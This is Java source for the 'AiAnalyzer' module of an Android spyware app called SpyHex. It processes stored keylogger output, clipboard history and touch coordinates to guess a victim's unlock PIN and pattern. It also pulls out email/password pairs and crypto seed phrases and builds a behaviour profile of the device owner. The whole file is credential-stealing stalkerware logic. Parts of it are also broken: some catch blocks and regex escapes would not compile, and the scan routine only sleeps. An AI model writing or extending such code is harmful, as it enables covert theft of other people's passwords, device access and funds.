package com.spyhex.app.features.aianalysis;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AiAnalyzer {
    private static AiAnalyzer instance;
    private final Context ctx;
    private final SharedPreferences prefs;
    private boolean isScanning = false;
    private final List<JSONObject> analysisQueue = new ArrayList<>();
    private final Map<String, Pattern> patterns = new HashMap<>();

    private AiAnalyzer() {
        this.ctx = SpyHexApp.getContext();
        this.prefs = ctx.getSharedPreferences("spyhex_ai", Context.MODE_PRIVATE);
        initPatterns();
    }

    public static synchronized AiAnalyzer getInstance() {
        if (instance == null) instance = new AiAnalyzer();
        return instance;
    }

    private void initPatterns() {
        // PIN patterns — common sequences
        patterns.put("pin_1234", Pattern.compile("^(1234|0000|1111|2222|3333|4444|5555|6666|7777|8888|9999)$"));
        patterns.put("pin_date", Pattern.compile("^(19|20)\d{2}$")); // Birth years
        patterns.put("pin_repeated", Pattern.compile("^(\d)\1\1\1$"));
        patterns.put("pin_sequence", Pattern.compile("^(0123|1234|2345|3456|4567|5678|6789|7890|0987|9876|8765|7654|6543|5432|4321|3210)$"));
        patterns.put("pin_corners", Pattern.compile("^(1397|7931|1793|3179)$")); // Corner patterns

        // Password patterns
        patterns.put("pass_weak", Pattern.compile("^(password|123456|qwerty|abc123|letmein|welcome|admin|login|master|passw0rd)$", Pattern.CASE_INSENSITIVE));
        patterns.put("pass_keyboard", Pattern.compile("^[qwertyuiopasdfghjklzxcvbnm]+$", Pattern.CASE_INSENSITIVE));
        patterns.put("pass_numeric", Pattern.compile("^\d{6,}$"));

        // Crypto wallet patterns
        patterns.put("btc_addr", Pattern.compile("^(1|3|bc1)[a-zA-Z0-9]{25,62}$"));
        patterns.put("eth_addr", Pattern.compile("^0x[a-fA-F0-9]{40}$"));
        patterns.put("seed_phrase", Pattern.compile("\b(able|about|above|abuse|accident|account|achieve|acid|across|act|action|active|actor|actual|adapt|add|address|adjust|admit|adult|advance|advice|aerobic|affair|afford|afraid|again|age|agent|agree|ahead|aim|air|airport|aisle|alarm|album|alcohol|alert|alien|all|alley|allow|almost|alone|alpha|already|also|alter|always|amateur|amazing|among|amount|amused|analyst|anchor|ancient|anger|angle|angry|animal|ankle|announce|annual|another|answer|antenna|antique|anxiety|any|apart|apology|appear|apple|approve|april|arch|arctic|area|arena|argue|arm|armed|armor|army|around|arrange|arrest|arrive|arrow|art|artefact|artist|artwork|ask|aspect|assault|asset|assist|assume|asthma|athlete|atom|attack|attend|attitude|attract|auction|audit|august|aunt|author|auto|autumn|average|avocado|avoid|awake|aware|away|awesome|awful|awkward|axis|baby|bachelor|bacon|badge|bag|balance|balcony|ball|bamboo|banana|banner|bar|barely|bargain|barrel|base|basic|basket|battle|beach|bean|beauty|because|become|beef|before|begin|behave|behind|believe|below|belt|bench|benefit|best|betray|better|between|beyond|bicycle|bid|bike|bind|biology|bird|birth|bitter|black|blade|blame|blanket|blast|bleak|bless|blind|blood|blossom|blouse|blue|blur|blush|board|boat|body|boil|bomb|bone|bonus|book|boost|border|boring|borrow|boss|bottom|bounce|box|boy|bracket|brain|brand|brass|brave|bread|breeze|brick|bridge|brief|bright|brilliant|bring|british|broad|broke|bronze|brother|brown|brush|bubble|buddy|budget|buffalo|build|bulb|bulk|bullet|bundle|bunker|burden|burger|burst|bus|business|busy|butter|buyer|buzz|cabbage|cabin|cable|cactus|cage|cake|call|calm|camera|camp|can|canal|cancel|candy|cannon|canoe|canvas|canyon|capable|capital|captain|car|carbon|card|cargo|carpet|carry|cart|case|cash|casino|castle|casual|cat|catalog|catch|category|cattle|caught|cause|caution|cave|ceiling|celery|cement|census|century|cereal|certain|chair|chalk|champion|change|chaos|chapter|charge|chase|chat|cheap|check|cheese|chef|cherry|chest|chicken|chief|child|chimney|choice|choose|chronic|chuckle|chunk|churn|cigar|cinnamon|circle|citizen|city|civil|claim|clap|clarify|claw|clay|clean|clerk|clever|click|client|cliff|climb|clinic|clip|clock|clog|close|cloth|cloud|clown|club|clump|cluster|clutch|coach|coast|coconut|code|coffee|coil|coin|collect|color|column|combine|come|comfort|comic|common|company|concert|conduct|confirm|connect|control|cook|cool|copper|copy|coral|core|corn|correct|cost|cotton|couch|could|council|count|country|couple|course|cousin|cover|coyote|crack|cradle|craft|cram|crane|crash|crater|crawl|crazy|cream|credit|creek|crew|cricket|crime|crisp|critic|crop|cross|crouch|crowd|crucial|cruel|cruise|crumble|crunch|crush|cry|crystal|cube|culture|cupboard|curious|current|curtain|curve|cushion|custom|cute|cycle|dad|damage|damp|dance|danger|daring|dash|daughter|dawn|day|deal|debate|debris|decade|december|decide|decline|decorate|decrease|deer|defense|define|defy|degree|delay|deliver|demand|demise|denial|dentist|deny|depart|depend|deposit|depth|deputy|derive|describe|desert|design|desk|despair|destroy|detail|detect|develop|device|devote|diagram|dial|diamond|diary|dice|diesel|diet|differ|digital|dignity|dilemma|dinner|dinosaur|direct|dirt|disagree|discover|disease|dish|dismiss|display|distance|divert|divide|divorce|dizzy|doctor|document|dog|doll|dolphin|domain|donate|donkey|donor|door|dose|double|dove|draft|dragon|drama|drastic|draw|dream|dress|drift|drill|drink|drive|drop|drum|dry|duck|dumb|dune|during|dust|dutch|duty|dwarf|dynamic|eager|eagle|early|earn|earth|ease|east|echo|ecology|economy|edge|edit|educate|effort|egg|eight|either|elbow|elder|electric|elegant|element|elephant|elevator|elite|else|embark|embody|embrace|emerge|emotion|employ|empty|enable|enact|end|endless|endorse|enemy|energy|enforce|engage|engine|enhance|enjoy|enlist|enough|enrich|enroll|ensure|enter|entire|entry|envelope|episode|equal|equip|era|erase|erode|erosion|error|erupt|escape|essay|essence|estate|eternal|ethics|evidence|evil|evoke|evolve|exact|example|excess|exchange|excite|exclude|excuse|execute|exercise|exhaust|exhibit|exile|exist|exit|exotic|expand|expect|expire|explain|expose|express|extend|extra|eye|eyebrow|fabric|face|faculty|fade|faint|faith|fall|false|fame|family|famous|fan|fancy|fantasy|farm|fashion|fat|fatal|father|fatigue|fault|favor|february|federal|fee|feed|feel|female|fence|festival|fetch|fever|few|fiber|fiction|field|figure|file|film|filter|final|finance|find|fine|finger|finish|fire|firm|first|fiscal|fish|fit|fitness|fix|flag|flame|flash|flat|flavor|flee|flight|flip|float|flock|floor|flower|fluid|flush|fly|foam|focus|fog|foil|fold|follow|food|foot|force|forest|forget|fork|fortune|forum|forward|fossil|foster|found|fox|fragile|frame|frequent|fresh|friend|fringe|frog|front|frost|frown|frozen|fruit|fuel|fun|funny|furnace|fury|future|gadget|gain|galaxy|gallery|game|gap|garage|garbage|garden|garlic|gas|gasp|gate|gather|gauge|gaze|general|genius|genre|gentle|genuine|gesture|ghost|giant|gift|giggle|ginger|giraffe|girl|give|glad|glance|glare|glass|glide|glimpse|globe|gloom|glory|glove|glow|glue|goat|gold|good|goose|gorilla|gospel|gossip|govern|gown|grab|grace|grade|gradual|grain|grand|grant|grape|grass|gravity|great|green|grid|grief|grit|grocery|group|grow|grunt|guard|guess|guide|guilt|guitar|gun|gym|habit|hair|half|hammer|hamster|hand|happy|harbor|hard|harsh|harvest|hat|have|hawk|hazard|head|health|heart|heavy|hedge|height|hello|help|hen|hero|hidden|high|hill|hint|hip|hire|history|hobby|hockey|hold|hole|holiday|hollow|holy|home|honey|hood|hope|horn|horror|horse|hospital|host|hotel|hour|house|hover|how|huge|human|humble|humor|hundred|hungry|hunt|hurdle|hurry|hurt|husband|hybrid|ice|icon|idea|identify|idle|ignore|ill|illegal|illness|image|imitate|immense|immune|impact|impose|improve|impulse|inch|include|income|increase|index|indicate|indoor|industry|infant|inflict|inform|inhale|inherit|initial|inject|injury|inmate|inner|innocent|input|inquiry|insane|insect|inside|inspire|install|intact|interest|into|invest|invite|involve|iron|island|isolate|issue|item|ivory|jacket|jaguar|jar|jazz|jealous|jeans|jelly|jewel|job|join|joke|journey|joy|judge|juice|jump|jungle|junior|junk|just|kangaroo|keen|keep|ketchup|key|kick|kid|kidney|kind|kingdom|kiss|kit|kitchen|kite|kitten|kiwi|knee|knife|knock|know|lab|label|labor|ladder|lady|lake|lamp|language|laptop|large|later|latin|laugh|laundry|law|lawn|lawsuit|layer|lazy|leader|leaf|learn|leave|lecture|left|leg|legal|legend|leisure|lemon|lend|length|lens|leopard|lesson|letter|level|liar|liberty|library|license|life|lift|light|like|limb|limit|link|lion|liquid|list|little|live|lizard|load|loan|lobster|local|lock|lonely|long|loop|lottery|loud|lounge|love|loyal|lucky|luggage|lumber|lunar|lunch|luxury|lying|machine|mad|magic|magnet|maid|mail|main|major|make|mammal|man|manage|mandate|mango|mansion|manual|maple|marble|march|margin|marine|market|marriage|mask|mass|master|match|material|math|matrix|matter|maximum|mayor|maze|meadow|mean|measure|meat|mechanic|medal|media|melody|melt|member|memory|mention|menu|mercy|merge|merit|merry|mesh|message|metal|method|middle|midnight|milk|million|mimic|mind|minimum|minister|minor|minute|miracle|mirror|misery|miss|mistake|mix|mixed|mixture|mobile|model|modify|mom|moment|monitor|monkey|month|moon|moral|more|morning|mosquito|mother|motion|motor|mountain|mouse|move|movie|much|muffin|mule|multiply|muscle|museum|mushroom|music|must|mutual|myself|mystery|myth|naive|name|napkin|narrow|nation|nature|near|neck|need|negative|neglect|neither|nephew|nerve|nest|net|network|neutral|never|news|next|nice|niece|night|nine|noble|noise|nominee|noodle|normal|north|nose|notable|note|nothing|notice|novel|now|nuclear|number|nurse|nut|oak|obey|object|oblige|obscure|observe|obtain|obvious|occur|ocean|october|odor|off|offer|office|often|oil|okay|old|olive|olympic|omit|once|one|onion|online|only|open|opera|opinion|oppose|option|orange|orbit|orchard|order|ordinary|organ|orient|original|orphan|ostrich|other|outdoor|outer|output|outside|oval|oven|over|own|owner|oxygen|oyster|ozone|pact|paddle|page|pair|palace|palm|panda|panel|panic|panther|paper|parade|parent|park|parrot|party|pass|patch|path|patient|patrol|pattern|pause|pave|payment|peace|peanut|pear|peasant|pelican|pen|penalty|pencil|people|pepper|perfect|permit|person|pet|phone|photo|phrase|physical|piano|picnic|picture|piece|pig|pigeon|pill|pilot|pink|pioneer|pipe|pistol|pitch|pizza|place|planet|plastic|plate|play|please|pledge|pluck|plug|plunge|poem|poet|point|polar|pole|police|pond|pony|pool|popular|portion|position|possible|post|potato|pottery|poverty|powder|power|practice|praise|predict|prefer|prepare|present|pretty|price|pride|primary|prime|prince|princess|print|prison|private|prize|problem|process|produce|profit|program|project|promote|proof|property|prosper|protect|proud|provide|public|pudding|pull|pulp|pulse|pumpkin|punch|pupil|puppy|purchase|purity|purpose|purse|push|put|puzzle|pyramid|quality|quantum|quarter|queen|question|quick|quiet|quilt|quit|quiz|quote|rabbit|raccoon|race|rack|radar|radio|rail|rain|raise|rally|ranch|random|range|rapid|rare|rate|rather|raven|raw|razor|ready|real|reason|rebel|rebuild|recall|receive|recipe|record|recycle|reduce|refer|reflect|reform|refuse|region|regret|regular|reject|relax|release|relief|rely|remain|remember|remind|remove|render|renew|rent|reopen|repair|repeat|replace|report|require|rescue|resemble|resist|resource|response|result|retire|retreat|return|reunion|reveal|review|reward|rhythm|rib|ribbon|rice|rich|ride|ridge|rifle|right|rigid|ring|riot|ripple|risk|ritual|rival|river|road|roast|robot|robust|rocket|romance|roof|room|rose|rotate|rough|round|route|royal|rubber|rude|rug|rule|run|runway|rural|sad|saddle|sadness|safe|sail|salad|salmon|salon|salt|salute|same|sample|sand|satisfy|satoshi|sauce|sausage|save|say|scale|scan|scare|scatter|scene|scheme|school|science|scissors|scorpion|scout|scrap|screen|script|scrub|sea|search|season|seat|second|secret|section|security|seed|seek|segment|select|sell|seminar|senior|sense|sentence|series|service|session|settle|setup|seven|shadow|shaft|shallow|share|shark|sharp|shave|sheep|sheet|shelf|shell|shelter|shift|shine|ship|shiver|shock|shoe|shoot|shop|short|shoulder|shove|shrimp|shrug|shuffle|shy|sibling|sick|side|siege|sight|sign|silent|silk|silly|silver|similar|simple|since|sing|siren|sister|sit|six|size|skate|sketch|ski|skill|skin|skirt|skull|slab|slam|sleep|slice|slide|slight|slim|slogan|slot|slow|slush|small|smart|smile|smoke|smooth|snack|snake|snap|sniff|snow|soap|soccer|social|sock|soda|soft|solar|soldier|solid|solution|solve|someone|song|soon|sorry|sort|soul|sound|soup|source|south|space|spare|spatial|spawn|speak|special|speed|spell|spend|sphere|spice|spider|spike|spin|spine|spirit|split|spoil|sponsor|spoon|sport|spot|spray|spread|spring|spy|square|squeeze|squirrel|stable|stadium|staff|stage|stairs|stamp|stand|start|state|stay|steak|steel|stem|step|stereo|stick|still|sting|stock|stomach|stone|stool|story|stove|strategy|street|strike|strong|struggle|student|stuff|stumble|style|subject|submit|subway|success|such|sudden|suffer|sugar|suggest|suit|summer|sun|super|supply|supreme|sure|surface|surge|surprise|surround|survey|suspect|swallow|swamp|swap|swarm|swear|sweet|swift|swim|swing|switch|sword|symbol|symptom|syrup|system|table|tackle|tag|tail|talent|talk|tank|tape|target|task|taste|tattoo|taxi|teach|team|tell|ten|tenant|tennis|tent|term|test|text|thank|that|theme|then|theory|there|they|thing|this|thought|three|thrive|throw|thumb|thunder|ticket|tide|tiger|tilt|timber|time|tiny|tip|tired|tissue|title|toast|tobacco|today|toe|together|toilet|token|tomato|tomorrow|tone|tongue|tonight|tool|tooth|top|topic|topple|torch|tornado|tortoise|toss|total|tourist|toward|tower|town|toy|track|trade|traffic|tragic|train|transfer|trap|trash|travel|tray|treat|tree|trend|trial|tribe|trick|trigger|trim|trip|trophy|trouble|truck|true|truly|trumpet|trust|truth|try|tube|tuition|tumble|tuna|tunnel|turkey|turn|turtle|twelve|twenty|twice|twin|twist|two|type|typical|ugly|umbrella|unable|unaware|uncle|uncover|under|undo|unfair|unfold|unhappy|uniform|unique|unit|universe|unknown|unlock|until|unusual|unveil|update|upgrade|uphold|upon|upper|upset|urban|urge|usage|use|used|useful|useless|usual|utility|vacant|vacuum|vague|valid|valley|valve|van|vanish|vapor|various|vast|vault|vehicle|velvet|vendor|venture|venue|verb|verify|version|very|vessel|veteran|viable|vibrant|vicious|victory|video|view|village|vintage|violin|virtual|virus|visa|visit|visual|vital|vivid|vocal|voice|volcano|volume|vote|voyage|wage|wagon|wait|walk|wall|walnut|want|war|warm|warrior|wash|wasp|waste|water|wave|way|wealth|weapon|wear|weasel|weather|web|wedding|weekend|weird|welcome|west|wet|whale|what|wheat|wheel|when|where|whip|whisper|wide|width|wife|wild|will|win|window|wine|wing|wink|winner|winter|wire|wisdom|wise|wish|witness|wolf|woman|wonder|wood|wool|word|work|world|worry|worth|wrap|wreck|wrestle|wrist|write|wrong|yard|year|yellow|you|young|youth|zebra|zero|zone|zoo)\b");
    }

    public void analyze(String analysisType, AnalysisCallback callback) {
        new Thread(() -> {
            try {
                JSONObject result = new JSONObject();
                result.put("analysisType", analysisType);
                result.put("timestamp", System.currentTimeMillis());

                switch (analysisType) {
                    case "pin":
                        analyzePin(result);
                        break;
                    case "pattern":
                        analyzePattern(result);
                        break;
                    case "behavior":
                        analyzeBehavior(result);
                        break;
                    case "credential":
                        analyzeCredentials(result);
                        break;
                    default:
                        result.put("error", "Unknown analysis type");
                }

                result.put("confidence", calculateConfidence(result));
                new Handler(Looper.getMainLooper()).post(() -> callback.onComplete(result));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void analyzePin(JSONObject result) throws Exception {
        // Analyze keylogger data for PIN patterns
        String klData = prefs.getString("keylogger_data", "");
        List<String> candidates = extractNumericSequences(klData, 4, 6);
        JSONArray pins = new JSONArray();
        Map<String, Integer> pinScores = new HashMap<>();

        for (String candidate : candidates) {
            int score = scorePin(candidate);
            if (score > 0) {
                pinScores.put(candidate, pinScores.getOrDefault(candidate, 0) + score);
            }
        }

        // Sort by score
        pinScores.entrySet().stream()
            .sorted((a, b) -> b.getValue().compareTo(a.getValue()))
            .limit(5)
            .forEach(e -> {
                try {
                    JSONObject p = new JSONObject();
                    p.put("pin", e.getKey());
                    p.put("score", e.getValue());
                    p.put("pattern", detectPinPattern(e.getKey()));
                    pins.put(p);
                } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
            });

        result.put("pinCandidates", pins);
        result.put("totalCandidates", candidates.size());
    }

    private void analyzePattern(JSONObject result) throws Exception {
        // Analyze touch events for unlock pattern
        String touchData = prefs.getString("touch_data", "");
        JSONArray patterns = new JSONArray();

        // Look for repeated coordinate sequences
        List<String> sequences = extractCoordinateSequences(touchData);
        Map<String, Integer> patternScores = new HashMap<>();

        for (String seq : sequences) {
            patternScores.put(seq, patternScores.getOrDefault(seq, 0) + 1);
        }

        patternScores.entrySet().stream()
            .sorted((a, b) -> b.getValue().compareTo(a.getValue()))
            .limit(3)
            .forEach(e -> {
                try {
                    JSONObject p = new JSONObject();
                    p.put("pattern", e.getKey());
                    p.put("frequency", e.getValue());
                    patterns.put(p);
                } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
            });

        result.put("patternCandidates", patterns);
    }

    private void analyzeBehavior(JSONObject result) throws Exception {
        // Analyze app usage patterns, time of day, unlock frequency
        long unlockCount = prefs.getLong("unlock_count", 0);
        long lastUnlock = prefs.getLong("last_unlock", 0);
        String topApps = prefs.getString("top_apps", "[]");

        result.put("unlockCount", unlockCount);
        result.put("lastUnlock", lastUnlock);
        result.put("topApps", new JSONArray(topApps));
        result.put("behaviorProfile", buildBehaviorProfile());
    }

    private void analyzeCredentials(JSONObject result) throws Exception {
        // Search for username/password patterns in clipboard and keylogs
        String clipboard = prefs.getString("clipboard_history", "");
        String keylogs = prefs.getString("keylogger_data", "");
        JSONArray creds = new JSONArray();

        // Email + password pairs
        Pattern emailPass = Pattern.compile("([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})[^\n]{0,50}(pass|pwd|password)[^\n]{0,20}[:=][^\n]{0,30}([\S]{4,20})");
        Matcher m = emailPass.matcher(keylogs + " " + clipboard);
        while (m.find()) {
            JSONObject c = new JSONObject();
            c.put("email", m.group(1));
            c.put("password", m.group(3));
            c.put("source", "keylog");
            creds.put(c);
        }

        // Crypto seed phrases
        Matcher seed = patterns.get("seed_phrase").matcher(keylogs + " " + clipboard);
        if (seed.find()) {
            JSONObject c = new JSONObject();
            c.put("type", "seed_phrase");
            c.put("value", seed.group());
            c.put("source", "clipboard");
            creds.put(c);
        }

        result.put("credentials", creds);
        result.put("credentialCount", creds.length());
    }

    private List<String> extractNumericSequences(String data, int minLen, int maxLen) {
        List<String> result = new ArrayList<>();
        if (data == null || data.isEmpty()) return result;
        Pattern p = Pattern.compile("\d{" + minLen + "," + maxLen + "}");
        Matcher m = p.matcher(data);
        while (m.find()) {
            result.add(m.group());
        }
        return result;
    }

    private List<String> extractCoordinateSequences(String data) {
        List<String> result = new ArrayList<>();
        if (data == null || data.isEmpty()) return result;
        // Extract coordinate pairs like (x,y)
        Pattern p = Pattern.compile("\((\d+),(\d+)\)");
        Matcher m = p.matcher(data);
        StringBuilder seq = new StringBuilder();
        while (m.find()) {
            int x = Integer.parseInt(m.group(1)) / 100; // Grid normalize
            int y = Integer.parseInt(m.group(2)) / 100;
            seq.append(x).append(",").append(y).append(";");
        }
        if (seq.length() > 0) {
            result.add(seq.toString());
        }
        return result;
    }

    private int scorePin(String pin) {
        int score = 0;
        for (Pattern p : patterns.values()) {
            if (p.matcher(pin).matches()) {
                score += 10;
            }
        }
        // Bonus for repeated occurrences
        return score;
    }

    private String detectPinPattern(String pin) {
        if (patterns.get("pin_repeated").matcher(pin).matches()) return "repeated";
        if (patterns.get("pin_sequence").matcher(pin).matches()) return "sequence";
        if (patterns.get("pin_date").matcher(pin).matches()) return "birth_year";
        if (patterns.get("pin_corners").matcher(pin).matches()) return "corner_pattern";
        return "unknown";
    }

    private JSONObject buildBehaviorProfile() throws Exception {
        JSONObject profile = new JSONObject();
        profile.put("unlockFrequency", prefs.getLong("unlock_count", 0));
        profile.put("activeHours", prefs.getString("active_hours", "unknown"));
        profile.put("preferredApps", new JSONArray(prefs.getString("top_apps", "[]")));
        return profile;
    }

    private int calculateConfidence(JSONObject result) {
        try {
            int confidence = 50; // Base
            if (result.has("pinCandidates") && result.getJSONArray("pinCandidates").length() > 0) {
                confidence += 20;
            }
            if (result.has("credentials") && result.getJSONArray("credentials").length() > 0) {
                confidence += 20;
            }
            if (result.has("patternCandidates") && result.getJSONArray("patternCandidates").length() > 0) {
                confidence += 10;
            }
            return Math.min(confidence, 99);
        } catch (Exception e) {
            return 50;
        }
    }

    public void scan(JSONObject config) {
        isScanning = true;
        new Thread(() -> {
            try {
                // Deep scan all accessible data
                Thread.sleep(2000); // Simulate deep analysis
                isScanning = false;
            } catch (Exception e) {
                isScanning = false;
            }
        }).start();
    }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("scanning", isScanning);
            s.put("queueSize", analysisQueue.size());
            s.put("patternsLoaded", patterns.size());
            s.put("ready", true);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }

    public interface AnalysisCallback {
        void onComplete(JSONObject result);
    }

    // Data feeders called by other modules
    public void feedKeylogger(String data) {
        String existing = prefs.getString("keylogger_data", "");
        prefs.edit().putString("keylogger_data", existing + "\n" + data).apply();
    }

    public void feedClipboard(String data) {
        String existing = prefs.getString("clipboard_history", "");
        prefs.edit().putString("clipboard_history", existing + "\n" + data).apply();
    }

    public void feedTouchEvent(int x, int y) {
        String existing = prefs.getString("touch_data", "");
        prefs.edit().putString("touch_data", existing + "(" + x + "," + y + ")").apply();
    }

    public void feedUnlockEvent() {
        prefs.edit().putLong("unlock_count", prefs.getLong("unlock_count", 0) + 1)
            .putLong("last_unlock", System.currentTimeMillis()).apply();
    }
}
